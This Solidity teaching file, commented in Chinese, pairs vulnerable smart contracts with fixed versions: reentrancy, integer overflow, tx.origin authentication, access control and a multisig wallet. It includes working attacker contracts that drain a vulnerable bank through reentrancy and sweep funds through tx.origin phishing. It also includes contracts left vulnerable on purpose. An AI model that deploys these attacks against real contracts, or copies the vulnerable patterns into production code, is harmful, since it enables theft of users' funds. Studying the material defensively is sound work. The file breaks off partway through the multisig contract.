// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// ============================================================
// 文件名称：smart_contract_examples.sol
// 功能说明：区块链安全智能合约示例合集
// 包含内容：
//   1. SafeMath 库（整数溢出防护）
//   2. 安全的 ERC20 代币合约
//   3. 重入攻击漏洞合约与修复版本
//   4. 整数溢出漏洞合约与修复版本
//   5. 访问控制示例（Ownable / AccessControl）
//   6. 多重签名钱包合约
// 注意事项：本文件仅供学习研究使用，请勿直接用于生产环境
// ============================================================


// ============================================================
// 第一部分：SafeMath 安全数学库
// 说明：Solidity 0.8 之前的版本没有内置溢出检查，需要使用 SafeMath
//       Solidity 0.8+ 已内置溢出检查，但学习 SafeMath 有助于理解原理
// ============================================================

/**
 * @title SafeMath 安全数学运算库
 * @dev 提供安全的数学运算，防止整数溢出和下溢
 *      每个运算都会进行边界检查，溢出时 revert
 */
library SafeMath {
    /**
     * @dev 安全加法
     * @param a 被加数
     * @param b 加数
     * @return c 加法结果
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        // 检查：结果必须大于等于被加数
        require(c >= a, "SafeMath: addition overflow");
    }

    /**
     * @dev 安全减法
     * @param a 被减数
     * @param b 减数
     * @return c 减法结果
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {
        // 检查：减数不能大于被减数
        require(b <= a, "SafeMath: subtraction overflow");
        c = a - b;
    }

    /**
     * @dev 安全乘法
     * @param a 被乘数
     * @param b 乘数
     * @return c 乘法结果
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        // 0 乘以任何数都是 0
        if (a == 0) {
            return 0;
        }
        c = a * b;
        // 检查：c / a 应该等于 b（排除溢出情况）
        require(c / a == b, "SafeMath: multiplication overflow");
    }

    /**
     * @dev 安全除法
     * @param a 被除数
     * @param b 除数
     * @return c 除法结果
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {
        // 检查：除数不能为 0
        require(b > 0, "SafeMath: division by zero");
        c = a / b;
    }
}


// ============================================================
// 第二部分：安全的 ERC20 代币合约
// 说明：实现了标准 ERC20 接口，并包含安全最佳实践
//       - 使用 SafeMath（演示用，0.8+ 已内置）
//       - 权限控制（onlyOwner）
//       - 事件完整
// ============================================================

/**
 * @title IERC20 ERC20 标准接口
 * @dev ERC20 代币标准接口定义
 */
interface IERC20 {
    // 返回代币总供应量
    function totalSupply() external view returns (uint256);
    // 返回指定地址的代币余额
    function balanceOf(address account) external view returns (uint256);
    // 转账
    function transfer(address recipient, uint256 amount) external returns (bool);
    // 查询授权额度
    function allowance(address owner, address spender) external view returns (uint256);
    // 授权
    function approve(address spender, uint256 amount) external returns (bool);
    // 从授权地址转账
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // 转账事件
    event Transfer(address indexed from, address indexed to, uint256 value);
    // 授权事件
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @title SecureERC20 安全的 ERC20 代币合约
 * @dev 实现了 ERC20 标准，包含安全最佳实践
 */
contract SecureERC20 is IERC20 {
    using SafeMath for uint256;  // 使用 SafeMath 库（演示用）

    // 代币名称
    string public name;
    // 代币符号
    string public symbol;
    // 小数位数
    uint8 public decimals;
    // 总供应量
    uint256 private _totalSupply;
    // 合约所有者（管理员）
    address public owner;

    // 余额映射
    mapping(address => uint256) private _balances;
    // 授权映射：owner -> spender -> amount
    mapping(address => mapping(address => uint256)) private _allowances;

    // 只有 owner 可以调用的修饰符
    modifier onlyOwner() {
        require(msg.sender == owner, "SecureERC20: caller is not the owner");
        _;
    }

    /**
     * @dev 构造函数
     * @param name_ 代币名称
     * @param symbol_ 代币符号
     * @param decimals_ 小数位数
     * @param initialSupply_ 初始供应量（注意：需要考虑小数位数）
     */
    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 initialSupply_
    ) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
        owner = msg.sender;

        // 铸造初始供应量给部署者
        _mint(msg.sender, initialSupply_);
    }

    /**
     * @dev 返回总供应量
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev 查询指定地址的余额
     * @param account 要查询的地址
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev 转账给指定地址
     * @param recipient 接收地址
     * @param amount 转账数量
     * @return bool 是否成功
     */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    /**
     * @dev 查询授权额度
     * @param owner_ 授权者
     * @param spender 被授权者
     */
    function allowance(address owner_, address spender) public view override returns (uint256) {
        return _allowances[owner_][spender];
    }

    /**
     * @dev 授权
     * @param spender 被授权地址
     * @param amount 授权数量
     * @return bool 是否成功
     * 注意：为避免授权竞争问题，建议使用 increaseAllowance / decreaseAllowance
     */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    /**
     * @dev 从授权地址转账
     * @param sender 扣款地址
     * @param recipient 收款地址
     * @param amount 转账数量
     * @return bool 是否成功
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        // 检查授权额度并扣减
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "SecureERC20: transfer amount exceeds allowance");
        // 使用 SafeMath 安全减法
        _approve(sender, msg.sender, currentAllowance.sub(amount));

        return true;
    }

    /**
     * @dev 增加授权额度（安全版 approve）
     * @param spender 被授权地址
     * @param addedValue 增加的数量
     */
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    /**
     * @dev 减少授权额度（安全版 approve）
     * @param spender 被授权地址
     * @param subtractedValue 减少的数量
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "SecureERC20: decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance.sub(subtractedValue));
        return true;
    }

    /**
     * @dev 铸造新代币（只有 owner 可以调用）
     * @param account 接收地址
     * @param amount 铸造数量
     */
    function mint(address account, uint256 amount) public onlyOwner returns (bool) {
        _mint(account, amount);
        return true;
    }

    /**
     * @dev 销毁代币
     * @param amount 销毁数量
     */
    function burn(uint256 amount) public returns (bool) {
        _burn(msg.sender, amount);
        return true;
    }

    // ========== 内部函数 ==========

    /**
     * @dev 内部转账函数
     * 遵循 Checks-Effects-Interactions 模式
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        // 检查（Checks）
        require(sender != address(0), "SecureERC20: transfer from the zero address");
        require(recipient != address(0), "SecureERC20: transfer to the zero address");
        require(_balances[sender] >= amount, "SecureERC20: transfer amount exceeds balance");

        // 生效（Effects）- 先更新状态
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);

        // 交互（Interactions）- 最后触发事件
        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev 内部铸造函数
     */
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "SecureERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);

        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev 内部销毁函数
     */
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "SecureERC20: burn from the zero address");
        require(_balances[account] >= amount, "SecureERC20: burn amount exceeds balance");

        _balances[account] = _balances[account].sub(amount);
        _totalSupply = _totalSupply.sub(amount);

        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev 内部授权函数
     */
    function _approve(
        address owner_,
        address spender,
        uint256 amount
    ) internal {
        require(owner_ != address(0), "SecureERC20: approve from the zero address");
        require(spender != address(0), "SecureERC20: approve to the zero address");

        _allowances[owner_][spender] = amount;

        emit Approval(owner_, spender, amount);
    }
}


// ============================================================
// 第三部分：重入攻击漏洞与修复
// 说明：对比展示存在重入漏洞的合约和修复后的安全合约
//       漏洞原理：外部调用前未更新状态，攻击者可重复提取
// ============================================================

/**
 * @title VulnerableBank 存在重入漏洞的银行合约
 * @dev 这是一个存在严重重入漏洞的合约，仅用于学习演示
 *      漏洞位置：withdraw 函数中，先转账后更新余额
 *      攻击方式：攻击者合约在 receive/fallback 中再次调用 withdraw
 */
contract VulnerableBank {
    // 用户余额映射
    mapping(address => uint256) public balances;

    /**
     * @dev 存款函数
     * 用户向合约发送 ETH，记录余额
     */
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * @dev 提款函数 - 存在重入漏洞！
     * ⚠️ 漏洞原因：先发送 ETH，后扣减余额
     *    攻击者可以在 receive 函数中再次调用 withdraw
     *    此时余额还未扣减，可以重复提取
     */
    function withdraw(uint256 _amount) public {
        // 1. 检查余额（Checks）
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // 2. 发送 ETH（Interactions）- 危险！先于状态更新
        //    call 会转发所有 gas 给接收方
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // 3. 扣减余额（Effects）- 太晚了！
        //    攻击者在第 2 步又调用了 withdraw，余额还没扣减
        balances[msg.sender] -= _amount;
    }

    /**
     * @dev 获取合约余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // 接收 ETH 的 fallback 函数
    receive() external payable {}
}

/**
 * @title ReentrancyAttacker 重入攻击合约
 * @dev 用于演示如何利用 VulnerableBank 的重入漏洞
 *      攻击流程：
 *      1. 先存入一定数量的 ETH
 *      2. 调用 withdraw 触发第一次提款
 *      3. receive 函数收到 ETH 后再次调用 withdraw
 *      4. 递归执行，直到银行合约余额不足或 gas 耗尽
 */
contract ReentrancyAttacker {
    // 漏洞银行合约的引用
    VulnerableBank public vulnerableBank;
    // 攻击者地址（用于提取收益）
    address public attacker;

    /**
     * @dev 构造函数
     * @param _bankAddress 漏洞银行合约地址
     */
    constructor(address _bankAddress) {
        vulnerableBank = VulnerableBank(payable(_bankAddress));
        attacker = msg.sender;
    }

    /**
     * @dev 发起攻击
     * 调用者需要发送 ETH 作为初始存款
     */
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");

        // 第一步：先存入一些 ETH（建立存款记录）
        vulnerableBank.deposit{value: msg.value}();

        // 第二步：第一次提款，触发 receive 中的递归提款
        vulnerableBank.withdraw(msg.value);
    }

    /**
     * @dev receive 函数 - 收到 ETH 时自动触发
     * 这是重入攻击的核心：
     * 当银行合约给我们转账时，这个函数被调用
     * 我们在里面再次调用 withdraw，实现重复提取
     */
    receive() external payable {
        // 只要银行合约还有钱（且不少于我们的初始存款），就继续提款
        // 注意：实际攻击中需要控制 gas 避免超出区块 gas limit
        uint256 amount = msg.value;
        if (address(vulnerableBank).balance >= amount) {
            vulnerableBank.withdraw(amount);
        }
    }

    /**
     * @dev 提取攻击所得
     * 只有攻击者可以调用
     */
    function withdrawStolenFunds() external {
        require(msg.sender == attacker, "Not attacker");
        payable(attacker).transfer(address(this).balance);
    }

    /**
     * @dev 获取攻击合约的 ETH 余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title SecureBank 修复重入漏洞的安全银行合约
 * @dev 使用三种防护方式：
 *      1. Checks-Effects-Interactions 模式（先更新状态，后交互）
 *      2. 重入锁（Reentrancy Guard）
 *      3. Pull 模式（用户主动提取）
 */
contract SecureBank {
    // 用户余额映射
    mapping(address => uint256) public balances;
    // 重入锁状态
    bool private _locked;

    /**
     * @dev 重入锁修饰符
     * 原理：进入函数时加锁，退出时解锁
     *      如果在执行过程中被再次调用，会因为锁已加而失败
     */
    modifier nonReentrant() {
        require(!_locked, "SecureBank: reentrant call");
        _locked = true;
        _;
        _locked = false;
    }

    /**
     * @dev 存款函数
     */
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * @dev 安全的提款函数
     * 防护方式 1：Checks-Effects-Interactions 模式
     * 防护方式 2：nonReentrant 重入锁
     */
    function withdraw(uint256 _amount) public nonReentrant {
        // 1. 检查（Checks）
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // 2. 生效（Effects）- 先更新状态！
        balances[msg.sender] -= _amount;

        // 3. 交互（Interactions）- 最后才转账
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }

    /**
     * @dev 获取合约余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // 接收 ETH
    receive() external payable {}
}

/**
 * @title PullPaymentBank Pull 模式银行合约
 * @dev 使用 Pull 模式（用户主动提取）防止 DoS 和重入
 *      原理：不主动给用户转账，而是记录待提取金额，让用户自己来取
 *      优点：即使某个用户是恶意合约，也不会影响其他人
 */
contract PullPaymentBank {
    // 用户余额
    mapping(address => uint256) public balances;
    // 待提取金额（已申请但未提取的）
    mapping(address => uint256) public pendingWithdrawals;

    /**
     * @dev 存款
     */
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * @dev 申请提款
     * 将余额转移到 pendingWithdrawals 中
     * 用户需要再调用 claimWithdrawal 来实际提款
     */
    function requestWithdrawal(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // 先扣减余额
        balances[msg.sender] -= _amount;
        // 增加待提取金额
        pendingWithdrawals[msg.sender] += _amount;
    }

    /**
     * @dev 提取已申请的款项
     * Pull 模式：用户主动来取
     */
    function claimWithdrawal() public {
        uint256 amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No pending withdrawal");

        // 先清零（Checks-Effects-Interactions）
        pendingWithdrawals[msg.sender] = 0;

        // 再转账
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}


// ============================================================
// 第四部分：整数溢出漏洞与修复
// 说明：对比展示存在整数溢出漏洞的合约和修复版本
//       注意：Solidity 0.8+ 已内置溢出检查，这里用 Solidity 0.6 语法演示
//       但本文件使用 0.8+，所以溢出会自动 revert
//       为了演示原理，我们使用 unchecked 块来模拟旧版本行为
// ============================================================

/**
 * @title VulnerableOverflow 存在整数溢出漏洞的代币合约
 * @dev 模拟 Solidity 0.8 之前版本的溢出问题
 *      使用 unchecked 块来模拟旧版本的静默溢出行为
 *      漏洞场景：transfer 函数中，余额不足时下溢导致余额变为巨大的数
 */
contract VulnerableOverflow {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) {
        totalSupply = _initialSupply;
        balanceOf[msg.sender] = _initialSupply;
    }

    /**
     * @dev 存在溢出漏洞的转账函数
     * ⚠️ 漏洞：使用 unchecked 模拟旧版本，下溢不会报错
     *    当余额不足时，balanceOf[msg.sender] - _value 会下溢
     *    变成一个巨大的数（2^256 - 差值）
     */
    function transfer(address _to, uint256 _value) public returns (bool) {
        // 故意不加余额检查，演示溢出效果
        // 正常应该有 require(balanceOf[msg.sender] >= _value)

        unchecked {
            // 下溢漏洞：如果余额 < _value，减法结果会变成巨大的数
            balanceOf[msg.sender] = balanceOf[msg.sender] - _value;
            // 上溢漏洞：如果 totalSupply 接近上限，加法会溢出
            balanceOf[_to] = balanceOf[_to] + _value;
        }

        return true;
    }

    /**
     * @dev 批量转账 - 存在乘法溢出漏洞
     * ⚠️ 漏洞：totalAmount = _value * count 可能溢出
     *    当 _value 很大时，乘以数量可能溢出变成 0 或很小的数
     *    导致 require 检查通过，但实际转出的代币远超预期
     */
    function batchTransfer(address[] memory _receivers, uint256 _value) public returns (bool) {
        uint256 count = _receivers.length;

        uint256 totalAmount;
        unchecked {
            // 乘法溢出漏洞
            totalAmount = _value * count;
        }

        // 如果 totalAmount 溢出为 0，这个检查会通过
        require(balanceOf[msg.sender] >= totalAmount, "Insufficient balance");

        unchecked {
            balanceOf[msg.sender] -= totalAmount;

            for (uint256 i = 0; i < count; i++) {
                balanceOf[_receivers[i]] += _value;
            }
        }

        return true;
    }
}

/**
 * @title SafeMathToken 使用 SafeMath 的安全代币合约
 * @dev 使用 SafeMath 库防止整数溢出（兼容 0.8 之前的版本）
 *      对于 Solidity 0.8+，内置了溢出检查，但 SafeMath 仍然有参考价值
 */
contract SafeMathToken {
    using SafeMath for uint256;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) {
        totalSupply = _initialSupply;
        balanceOf[msg.sender] = _initialSupply;
    }

    /**
     * @dev 安全的转账函数
     * 使用 SafeMath.sub 和 SafeMath.add 进行安全运算
     * 溢出时会 revert
     */
    function transfer(address _to, uint256 _value) public returns (bool) {
        // 使用 SafeMath 的 sub 方法，会自动检查下溢
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
        // 使用 SafeMath 的 add 方法，会自动检查上溢
        balanceOf[_to] = balanceOf[_to].add(_value);
        return true;
    }

    /**
     * @dev 安全的批量转账
     * 使用 SafeMath.mul 防止乘法溢出
     */
    function batchTransfer(address[] memory _receivers, uint256 _value) public returns (bool) {
        uint256 count = _receivers.length;
        // SafeMath.mul 会检查乘法溢出
        uint256 totalAmount = _value.mul(count);

        require(balanceOf[msg.sender] >= totalAmount, "Insufficient balance");

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(totalAmount);

        for (uint256 i = 0; i < count; i++) {
            balanceOf[_receivers[i]] = balanceOf[_receivers[i]].add(_value);
        }

        return true;
    }
}

/**
 * @title BuiltInCheckedToken Solidity 0.8+ 内置检查
 * @dev Solidity 0.8 及以上版本内置了整数溢出/下溢检查
 *      不需要 SafeMath 库，运算溢出时会自动 revert
 *      如果明确知道不会溢出，可以用 unchecked 块节省 gas
 */
contract BuiltInCheckedToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) {
        totalSupply = _initialSupply;
        balanceOf[msg.sender] = _initialSupply;
    }

    /**
     * @dev Solidity 0.8+ 自动检查溢出
     * 减法会自动检查下溢，加法会自动检查上溢
     * 不需要额外的库
     */
    function transfer(address _to, uint256 _value) public returns (bool) {
        // 自动检查下溢，如果余额不足会 revert
        balanceOf[msg.sender] -= _value;
        // 自动检查上溢
        balanceOf[_to] += _value;
        return true;
    }

    /**
     * @dev 演示 unchecked 块的用法
     * 当确定不会溢出时，使用 unchecked 可以节省 gas
     */
    function getSum(uint256 a, uint256 b) public pure returns (uint256) {
        // 假设我们确定 a + b 不会溢出
        unchecked {
            return a + b;  // 不检查溢出，更省 gas
        }
    }
}


// ============================================================
// 第五部分：访问控制示例
// 说明：展示多种访问控制模式
//       1. Ownable：单一所有者模式
//       2. RoleBased：基于角色的权限控制
//       3. tx.origin 钓鱼漏洞演示
// ============================================================

/**
 * @title Ownable 单一所有者合约
 * @dev 最基本的访问控制：合约有一个所有者，只有所有者可以调用特定函数
 *      包含所有权转移和 renounceOwnership 功能
 */
contract Ownable {
    // 合约所有者地址
    address public owner;

    // 所有权转移事件
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev 构造函数：将部署者设为初始所有者
     */
    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    /**
     * @dev 只有所有者可以调用的修饰符
     */
    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev 转移所有权
     * 只有当前所有者可以调用
     * @param newOwner 新的所有者地址
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    /**
     * @dev 放弃所有权
     * 只有当前所有者可以调用，调用后合约没有所有者
     * 注意：这是一个危险操作，调用后 onlyOwner 函数将无法使用
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}

/**
 * @title RoleBasedAccessControl 基于角色的权限控制
 * @dev 更灵活的权限控制模式，可以定义多种角色
 *      类似于 OpenZeppelin 的 AccessControl
 *      适合需要多种权限等级的复杂合约
 */
contract RoleBasedAccessControl {
    // 角色定义（用 bytes32 表示）
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");

    // 角色 -> 地址 -> 是否拥有该角色
    mapping(bytes32 => mapping(address => bool)) private _roles;
    // 角色 -> 管理员角色（哪个角色可以授予/撤销此角色）
    mapping(bytes32 => bytes32) private _adminRoles;

    // 角色授予事件
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);
    // 角色撤销事件
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);

    /**
     * @dev 构造函数
     * 设置默认的管理员角色为 ADMIN_ROLE
     * 将部署者设为管理员
     */
    constructor() {
        _adminRoles[ADMIN_ROLE] = ADMIN_ROLE;  // 管理员角色的管理员是自己
        _adminRoles[MINTER_ROLE] = ADMIN_ROLE; // 铸币角色的管理员是 ADMIN_ROLE
        _adminRoles[PAUSER_ROLE] = ADMIN_ROLE; // 暂停角色的管理员是 ADMIN_ROLE

        // 将部署者设为管理员
        _grantRole(ADMIN_ROLE, msg.sender);
    }

    /**
     * @dev 检查账户是否拥有某角色
     */
    function hasRole(bytes32 role, address account) public view returns (bool) {
        return _roles[role][account];
    }

    /**
     * @dev 只有拥有特定角色才能调用的修饰符
     */
    modifier onlyRole(bytes32 role) {
        require(hasRole(role, msg.sender), "AccessControl: missing role");
        _;
    }

    /**
     * @dev 授予角色
     * 只有对应角色的管理员才能授予
     */
    function grantRole(bytes32 role, address account) public onlyRole(_adminRoles[role]) {
        _grantRole(role, account);
    }

    /**
     * @dev 撤销角色
     * 只有对应角色的管理员才能撤销
     */
    function revokeRole(bytes32 role, address account) public onlyRole(_adminRoles[role]) {
        _revokeRole(role, account);
    }

    /**
     * @dev 撤销自己的角色
     */
    function renounceRole(bytes32 role) public {
        _revokeRole(role, msg.sender);
    }

    // ========== 内部函数 ==========

    function _grantRole(bytes32 role, address account) internal {
        if (!hasRole(role, account)) {
            _roles[role][account] = true;
            emit RoleGranted(role, account, msg.sender);
        }
    }

    function _revokeRole(bytes32 role, address account) internal {
        if (hasRole(role, account)) {
            _roles[role][account] = false;
            emit RoleRevoked(role, account, msg.sender);
        }
    }
}

/**
 * @title SecureTokenWithRBAC 带有角色权限控制的代币合约
 * @dev 继承 RoleBasedAccessControl，实现带权限控制的代币
 *      - ADMIN 可以管理角色
 *      - MINTER 可以铸造代币
 *      - PAUSER 可以暂停合约
 */
contract SecureTokenWithRBAC is RoleBasedAccessControl {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;
    bool public paused;

    string public name = "SecureRBAC";
    string public symbol = "SRBAC";
    uint8 public decimals = 18;

    // 暂停事件
    event Paused(address account);
    // 恢复事件
    event Unpaused(address account);

    /**
     * @dev 暂停时不能调用的修饰符
     */
    modifier whenNotPaused() {
        require(!paused, "Token is paused");
        _;
    }

    /**
     * @dev 铸造代币 - 只有 MINTER_ROLE 可以调用
     */
    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) whenNotPaused {
        totalSupply += amount;
        balances[to] += amount;
    }

    /**
     * @dev 暂停合约 - 只有 PAUSER_ROLE 可以调用
     */
    function pause() public onlyRole(PAUSER_ROLE) {
        paused = true;
        emit Paused(msg.sender);
    }

    /**
     * @dev 恢复合约 - 只有 PAUSER_ROLE 可以调用
     */
    function unpause() public onlyRole(PAUSER_ROLE) {
        paused = false;
        emit Unpaused(msg.sender);
    }

    /**
     * @dev 转账
     */
    function transfer(address to, uint256 amount) public whenNotPaused returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
}

/**
 * @title TxOriginVulnerable 使用 tx.origin 的漏洞合约
 * @dev 演示 tx.origin 钓鱼攻击的漏洞
 *      ⚠️ 漏洞：使用 tx.origin 进行身份验证
 *      攻击者可以诱导用户调用恶意合约，恶意合约再调用本合约
 *      此时 tx.origin 仍然是用户，验证会通过
 */
contract TxOriginVulnerable {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev 危险的转账函数
     * ⚠️ 使用 tx.origin 验证身份是不安全的
     *    如果 owner 被诱导调用了恶意合约，恶意合约可以调用这个函数
     *    此时 tx.origin == owner，验证会通过
     */
    function transferTo(address payable _to, uint256 _amount) public {
        // 危险！用 tx.origin 而不是 msg.sender
        require(tx.origin == owner, "Not the owner");
        _to.transfer(_amount);
    }

    // 接收 ETH
    receive() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title TxOriginAttacker tx.origin 钓鱼攻击合约
 * @dev 演示如何利用 tx.origin 漏洞
 *      攻击流程：
 *      1. 部署攻击合约
 *      2. 诱导 owner 向攻击合约发送 ETH（或调用某个函数）
 *      3. 攻击合约的 receive/fallback 被触发
 *      4. 攻击合约调用漏洞合约的 transferTo，把钱转给攻击者
 *      5. 因为 tx.origin == owner，验证通过
 */
contract TxOriginAttacker {
    TxOriginVulnerable public vulnerable;
    address payable public attacker;

    constructor(address _vulnerableAddress) {
        vulnerable = TxOriginVulnerable(payable(_vulnerableAddress));
        attacker = payable(msg.sender);
    }

    /**
     * @dev receive 函数 - 收到 ETH 时触发攻击
     * 当 owner 向这个合约发送 ETH 时
     * 我们调用漏洞合约的转账函数，把钱转走
     */
    receive() external payable {
        // 调用漏洞合约，此时 tx.origin 是调用者（owner）
        vulnerable.transferTo(attacker, address(vulnerable).balance);
    }

    /**
     * @dev 获取攻击合约余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}


// ============================================================
// 第六部分：多重签名钱包合约
// 说明：实现一个简单的多重签名钱包
//       需要 M/N 个所有者签名才能执行交易
//       提高资金安全性，防止单密钥被盗导致资金损失
// ============================================================

/**
 * @title MultiSigWallet 多重签名钱包合约
 * @dev 简单的多签钱包实现
 *      - 多个所有者共同管理资金
 *      - 需要指定数量的签名才能执行交易
 *      - 支持提交、确认、执行交易
 *
 * 使用场景：
 *      - 交易所冷钱包
 *      - 项目方金库
 *      - DAO 资金管理
 *      - 家庭共同资产管理
 */
contract MultiSigWallet {
    // ========== 事件定义 ==========

    // 提交交易事件
    event Submission(uint256 indexed transactionId);
    // 确认交易事件
    event Confirmation(address indexed sender, uint256 indexed transactionId);
    // 撤销确认事件
    event Revocation(address indexed sender, uint256 indexed transactionId);
    // 执行交易事件
    event Execution(uint256 indexed transactionId);
    // 交易执行失败事件
    event ExecutionFailure(uint256 indexed transactionId);
    // 所有者添加事件
    event OwnerAddition(address indexed owner);
    // 所有者移除事件
    event OwnerRemoval(address indexed owner);
    // 签名要求变更事件
    event RequirementChange(uint256 required);

    // ========== 状态变量 ==========

    // 交易结构体
    struct Transaction {
        address destination;  // 目标地址
        uint256 value;        // 转账金额（wei）
        bytes data;           // 调用数据
        bool executed;        // 是否已执行
    }

    // 所有者列表
    address[] public owners;
    // 所有者映射（快速查询是否为所有者）
    mapping(address => bool) public isOwner;
    // 需要的确认数
    uint256 public required;
    // 交易 ID 计数器
    uint256 public transactionCount;
    // 交易详情
    mapping(uint256 => Transaction) public transactions;
    // 交易确认情况：交易ID -> 所有者 -> 是否确认
    mapping(uint256 => mapping(address => bool)) public confirmations;

    // ========== 修饰符 ==========

    /**
     * @dev 只有所有者可以调用
     */
    modifier onlyOwner() {
        require(isOwner[msg.sender], "MultiSigWallet: not owner");
        _;
    }

    /**
     * @dev 交易必须存在
     */
    modifier transactionExists(uint256 transactionId) {
        require(transactions[transactionId].destination != address(0), "MultiSigWallet: transaction does not exist");
        _;
    }

    /**
     * @dev 交易未被确认
     */
    modifier notConfirmed(uint256 transactionId) {
        require(!confirmations[transactionId][msg.sender], "MultiSigWallet: transaction already confirmed");
        _;
    }

    /**
     * @dev 交易未被执行
     */
    modifier notExecuted(uint256 transactionId) {
        require(!transactions[transactionId].executed, "MultiSigWallet: transaction already executed");
        _;
    }

    // ========== 构造函数 ==========

    /**
     * @dev 构造函数
     * @param _owners 所有者地址列表
     * @param _required 需要的确认数量
     */
    constructor(address[] memory _owners, uint256 _required) {
        // 检查参数有效性
        require(_owners.length > 0, "MultiSigWallet: owners required");
        require(_required > 0, "MultiSigWallet: invalid required number");
        require(_required <= _owners.length, "MultiSigWallet: required > owners");

        // 初始化所有者列表
        for (uint256 i = 0; i < _owners.length; i++) {
            address owner = _owners[i];
            require(owner != address(0), "MultiSigWallet: invalid owner");
            require(!isOwner[owner], "MultiSigWallet: duplicate owner");

            isOwner[owner] = true;
            owners.push(owner);
        }

        required = _required;
    }

    // ========== 外部函数 ==========

    /**
     * @dev 提交交易
     * 只有所有者可以提交
     * 提交后需要其他所有者确认
     * @param destination 目标地址
     * @param value 转账金额
     * @param data 调用数据
     * @return transactionId 交易 ID
     */
    function submitTransaction(
        address destination,
        uint256 value,
        bytes memory data
    )
        public
        onlyOwner
        returns (uint256 transactionId)
    {
        transactionId = addTransaction(destination, value, data);
        confirmTransaction(transactionId);
    }

    /**
     * @dev 确认交易
     * 只有所有者可以确认
     * @param transactionId 交易 ID
     */
    function confirmTransaction(uint256 transactionId)
        public
        onlyOwner
        transactionExists(transactionId)
        notConfirmed(transactionId)
        notExecuted(transactionId)
    {
        confirmations[transactionId][msg.sender] = true;
        emit Confirmation(msg.sender, transactionId);

        // 检查是否达到所需确认数，如果是则执行交易
        executeTransaction(transactionId);
    }

    /**
     * @dev 撤销确认
     * 在交易执行前可以撤销自己的确认
     * @param transactionId 交易 ID
     */
    function revokeConfirmation(uint256 transactionId)
        public
        onlyOwner
